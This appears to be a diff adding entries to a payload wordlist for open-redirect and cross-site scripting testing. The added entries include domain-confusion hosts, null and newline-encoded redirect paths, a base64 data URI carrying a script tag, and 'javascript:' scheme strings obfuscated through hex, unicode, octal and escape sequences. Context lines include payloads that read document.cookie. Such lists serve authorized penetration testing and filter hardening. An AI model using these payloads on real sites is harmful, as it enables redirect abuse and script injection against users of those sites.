@@ -1,4 +1,5 @@
 .example.com
+whitelisteddomain.comx
 /%09/example.com
 /%10/example.com
 /%13/example.com
@@ -438,6 +439,10 @@ java%0d%0ascript%0d%0a:alert(0)
 java%0dscript:alert(1)
 javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
 javascript://%0aalert(1)
+/%00/example.com
+/%0A/example.com
+/%OD/example.com
+/%09/example.com
 javascript://example.com?%a0alert%281%29
 javascript://https://example.com/?z=%0Aalert(1)
 javascript://https://whitelisteddomain.com/?z=%0Aalert(1)
@@ -456,3 +461,10 @@ whitelisteddomain.comx.example.com
 ゝexample.com
 ーexample.com
 ｰexample.com
+data:html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert
+java\[0x0a]script:alert
+ja\nva\tscript\r:alert
+\j\av\a\s\cr\i\pt\:\a\l\ert
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
